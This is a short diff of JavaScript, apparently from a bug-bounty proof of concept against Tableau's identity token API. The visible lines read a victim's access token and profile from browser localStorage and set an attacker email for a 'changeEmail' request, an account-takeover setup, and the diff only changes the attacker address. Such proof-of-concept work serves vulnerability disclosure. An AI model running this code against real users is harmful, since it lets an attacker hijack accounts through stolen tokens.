@@ -3,7 +3,7 @@ const url = 'https://id.tableau.com/api/4.0/tokens';
 const uid = JSON.parse(localStorage.user_profile).uid;
 const type = "changeEmail";
 const token = localStorage.access_token 
-const attacker_email = "kfoleysanchez+attackerpoc@wearehackerone.com"
+const attacker_email = "kfoleysanchez+attackerpoc@salesforce.com"
 const victim_email = JSON.parse(localStorage.user_profile).email 
 
 const headers = {
